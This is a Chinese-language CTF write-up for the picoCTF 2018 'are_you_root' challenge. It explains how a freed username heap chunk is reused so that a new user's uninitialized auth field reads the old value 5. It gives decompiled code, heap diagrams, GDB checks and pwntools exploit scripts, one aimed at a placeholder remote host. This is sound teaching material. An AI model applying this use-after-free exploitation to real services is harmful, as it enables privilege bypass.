# 知识点

Heap

# 题目分析

分类：PWN / Heap。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [PicoCTF_2018_are_you_root](PicoCTF_2018_are_you_root)
- [PicoCTF_2018_are_you_root.py](PicoCTF_2018_are_you_root.py)
- [PicoCTF_2018_are_you_root_patched](PicoCTF_2018_are_you_root_patched)
- [exp.py](exp.py)
- [input.bin](input.bin)
- [solve.py](solve.py)

## 已有分析

- [picoctf_2018_are_you_root_WP_学习版.md](notes/picoctf_2018_are_you_root_WP_%E5%AD%A6%E4%B9%A0%E7%89%88.md)


### picoCTF 2018 are_you_root：不是 hook 题，而是字段残留题

> [!important] 这篇的边界
> 本文复盘原题公开路线，训练“分配 → 写入 → 释放 → 复用 → 逻辑判断”的因果链。原 picoCTF 2018 远端已下线；不要把历史地址、提示符或 9 字节输入直接用于别的服务。

#### 一句话

题目利用的不是溢出，也不是 tcache poisoning：第一次 `login` 写入的 username 缓冲区被 `reset` 释放；第二次 `login` 创建 user 时若复用同一块内存、又没有初始化权限字段，旧字节就可能被当成新 user 的权限值。

```text
第一次 login：username chunk 里放入非零字节
                 ↓
reset：释放旧对象/缓冲区，但 allocator 不承诺把物理字节清零
                 ↓
第二次 login：新 user 对象复用相同 chunk
                 ↓
未初始化的权限字段读到旧字节
                 ↓
get-flag：按权限字段做逻辑判断
```

#### 先分清三个概念

| 名称 | 在本题中的意思 | 不是 |
|---|---|---|
| 堆复用 | `malloc` 把已释放 chunk 再交给后来的请求 | “旧对象仍然合法” |
| 未初始化字段 | 新对象创建后某个字段没有被赋成已知值 | 所有 `malloc` 都必然保留旧值 |
| 逻辑绕过 | 权限检查读取了错误/残留的字段 | 真正拿到 Linux root 权限 |

公开 WP 的序列以 `0x05` 填充 9 个字节；它在原题对象布局中触发权限条件，但不代表通用的 `ROOT = 5` 规则。`get-flag` 成功也不等价于系统权限提升。

#### 程序入口：先把 IDA 变量还原成人话

用户提供的伪代码里最重要的几行可以还原为：

```c
struct user {
    char *name;             // +0x00，8 字节
    unsigned int auth;      // +0x08，4 字节
    // 编译器为 8 字节对齐补出 4 字节，结构体请求大小为 0x10
};

struct user *current = NULL;

// login <name>
current = malloc(0x10);
current->name = strdup(name);

// set-auth <0~4>
current->auth = strtoul(value, NULL, 10);

// get-flag
if (current->auth == 5)
    give_flag();

// reset
free(current->name);
current = NULL;
```

> [!warning] `reset` 的真实效果
> 它释放的是 `current->name`，**没有**释放 `current` 这个 `0x10` 的 user 结构体。随后把唯一的 `current` 指针清零，因此 user 结构体变成泄漏内存；被释放、可能被复用的是 username chunk。这正是题目后续能把“旧用户名的数据”变成“新 user 的 `auth` 字段”的原因。

##### IDA 中的 `s`、`v10`、`v11` 不是三份独立输入

伪代码显示 `char s[6]`，却又有 `fgets(s, 512, stdin)`；若真的只有 6 字节数组，这当然会是严重栈溢出。但紧接着的 `v10`、`v11` 在栈上正好排在 `s` 后面，且 `login` 用 `strtok(v10, "\\n")`、`set-auth` 用 `strtok(v11, "\\n")`。

```text
一条输入： login <name>\n

栈上的连续原始字节（IDA 为了方便，拆成多个局部变量显示）
+----------------+------------------------------+
| s[0..5]        | v10 / v11 后续字节            |
| "login "       | <name> ... "\n\0"           |
+----------------+------------------------------+
                  ^ login 时 strtok 从这里取 name
```

因此这段反编译更合理的解释是：**同一个较大的命令缓冲区被 IDA 切片显示**，而不是已经证明“`s[6]` 被 `fgets(512)` 溢出”。要判断是否真有栈溢出，应回到汇编核对 `lea rdi, [rbp-?]`、`sub rsp, ?` 和传给 `fgets` 的长度，而不是只看伪代码变量名。

#### 第六步：为什么第二次 `login` 会让 `auth` 变成 5

这是本题最关键的一步。以第一次用户名为 9 个 `0x05` 字节为例：`strdup` 还会写一个结尾 `\x00`，因此申请约 10 字节；在典型 64 位 glibc 中，它和 `malloc(0x10)` 都落入 **chunk size `0x20`** 类别。

```text
第一次 login

user A = malloc(0x10)                 username B = strdup("\x05" * 9)
┌──────────────────────────┐          ┌──────────────────────────┐
│ +0x00 name ──────────────┼─────────►│ +0x00 05 05 05 05 ...    │
│ +0x08 auth：未初始化      │          │ +0x08 05 00 ...          │
└──────────────────────────┘          └──────────────────────────┘
            chunk size 0x20                       chunk size 0x20

reset
free(B)；B 进入对应大小的空闲链。A 没有 free，只是丢失了指针。

第二次 login
user C = malloc(0x10)  ──可能复用──► 原 B 的用户区
┌──────────────────────────┐
│ +0x00 name = 新用户名地址 │  ← login 会重新写入
│ +0x08 auth = 05 00 00 00  │  ← 该字段没有初始化，残留恰好被读到
└──────────────────────────┘
                 ↓
get-flag 检查 `auth == 5`，条件成立才调用 give_flag
```

这里不能省略任一条件：

1. 第一次 username 的请求和第二次 user 的请求必须属于可复用的同一大小类别；
2. `reset` 必须真的释放 username；
3. 第二次 `malloc(0x10)` 必须实际拿到原 username 的地址；
4. `auth` 必须位于 `+0x08`，且 login 没有覆盖或初始化它；
5. `get-flag` 的比较必须确实是 32 位整数 `auth == 5`。

所以 `05` 只是原始字节，最后必须在 GDB 中确认 `*(unsigned int *)(new_user + 8) == 5`；不能只看到第一个字节是 `05` 就下结论。

#### 为什么“复用”会影响字段

假设旧 username 申请到的用户区如下：

```text
旧 username chunk（第一次 login）
+0x00  05 05 05 05 05 05 05 05 05 ...
```

`reset` 后，程序语义上不再拥有旧对象；但 `free` 不会为了安全把每个用户字节归零。若新的 `user` 结构体恰好从同一地址开始，且权限字段位于开始附近并没有初始化，就可能出现：

```text
新 user 结构体（第二次 login）
+0x00  某个权限相关字段读取到 05 ...
```

能否发生取决于 **请求大小、分配顺序、结构体字段偏移和构造代码**。这是题目专属的对象布局题，不是看到 `malloc/free` 就能照抄的通用堆利用。

#### 本地可调试脚本

以下脚本只针对用户提供的本地文件名和原题命令协议。默认运行 `pwninit` 生成的 patched 文件；`GDB` 参数会先停在 `main`，方便你手动在 `malloc`、`free` 或 `give_flag` 处下断点。

```python
from pwn import *

context.binary = elf = ELF('./PicoCTF_2018_are_you_root_patched', checksec=False)
context.log_level = 'info'

GDB_SCRIPT = '''
set pagination off
break main
continue
'''

def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=GDB_SCRIPT)
    return process([elf.path])

io = start()

def cmd(data):
    io.sendlineafter(b'> ', data)

commands = [
    b'login ' + bytes([5]) * 9,
    b'reset',
    b'login a',
    b'show',
    b'get-flag',
]
for command in commands:
    cmd(command)
io.interactive()
```

运行方式：`python3 solve.py`；需要 GDB 时：`python3 solve.py GDB`。原题远端已下线，因此不要填历史远端地址。脚本没有把 `interactive()` 当成功证据：应先看 `show` 是否出现 `[5]`，再确认 `get-flag` 的输出。

> [!tip] 先确认 patched 文件真的使用题目 libc
> 在题目目录执行 `file ./PicoCTF_2018_are_you_root_patched`、`patchelf --print-interpreter ./PicoCTF_2018_are_you_root_patched`、`ldd ./PicoCTF_2018_are_you_root_patched`。用户提供的 `pwninit` 输出使用的是 `ld-linux-x86-64.so.2`，因此目录名即使叫 `i386`，也不能代替 `file` 的架构结论；以 ELF 实际架构为准。

#### GDB 应该验证什么

1. 在第一次 `login` 后记录 user A、username B 的返回地址、请求大小和 `0x05` marker。
2. 在 `reset` 前后确认调用的是 `free(B)`；不要误记为 `free(A)`。`current = NULL` 只是丢失 A 的指针，不会替你释放 A。
3. 第二次 `login` 返回后，不使用 B 的悬空指针；用先前记录的 **整数地址** 与新 user C 的地址比较，并查看 `C+8`。
4. 在 `get-flag` 的判断处分断点，确认比较的是哪个字段、它的实际 4 字节整数是什么。

```gdb
### 示例：函数名、PIE 运行时地址按当前附件替换
break reset
break give_flag
run

### 观察新对象（有效指针）：+0 是 name 指针，+8 是 auth
x/2gx <new_user_address>
x/wx <new_user_address>+8
```

只有“新对象地址复用 + 新对象字段未初始化 + 判断确实读取该字段”三项都成立，路线才是已验证。单独看见相同地址，或单独看见非零字节，都不够。

#### 常见误区

- `free` 后地址还在变量里，不等于对象仍能访问；那是悬空指针。
- `malloc` 常会复用空闲块，不等于 C 标准保证下一次一定返回同一个地址。
- 未初始化读是程序错误，不能把“这次看起来是 5”当成稳定规则；要看构造与分配顺序。
- 本题与 `__free_hook`、Safe-Linking、double free 没有直接关系。

#### 关联与资料

- 模板入口：`常用EXP模板与选择#特殊模板：picoCTF 2018 are_you_root`。
- 原理：`UAF详解` · `未初始化数据读取与信息泄露` · `类型混淆与对象复用`。
- 公开对照：[Alan 的 picoCTF 2018 WP](https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/binary-exploitation/#are-you-root) · [安全客 heap 合集](https://www.anquanke.com/post/id/241064) · [BUUCTF 复盘入口](https://www.cnblogs.com/Dav-ove3/p/17244065.html#picoctf_2018_are_you_root_100)。

#### 当前证据与下一步

- 静态：公开 WP 给出题目专属命令序列与“未初始化字段 + chunk 复用”路线。
- 未验证：当前本地附件是否一致、每次实际分配地址、权限字段偏移、脚本是否产生预期输出。
- 下一步：拿到合法附件后，按上方 GDB 四点记录一轮，再决定是否将状态从 `STATIC_ONLY` 更新。


# EXP

- [PicoCTF_2018_are_you_root.py](PicoCTF_2018_are_you_root.py)
- [exp.py](exp.py)
- [solve.py](solve.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import *
 
#p = process('./PicoCTF_2018_are_you_root')
p = remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
 

p.sendlineafter('>','login ' + 'a'*0x8 + '\x05')
 
p.sendlineafter('>','reset')

p.sendlineafter('>','login aa') #这个aa可以随便输入,只要有并且不溢出就好

p.sendlineafter('>','get-flag')
p.interactive()
```
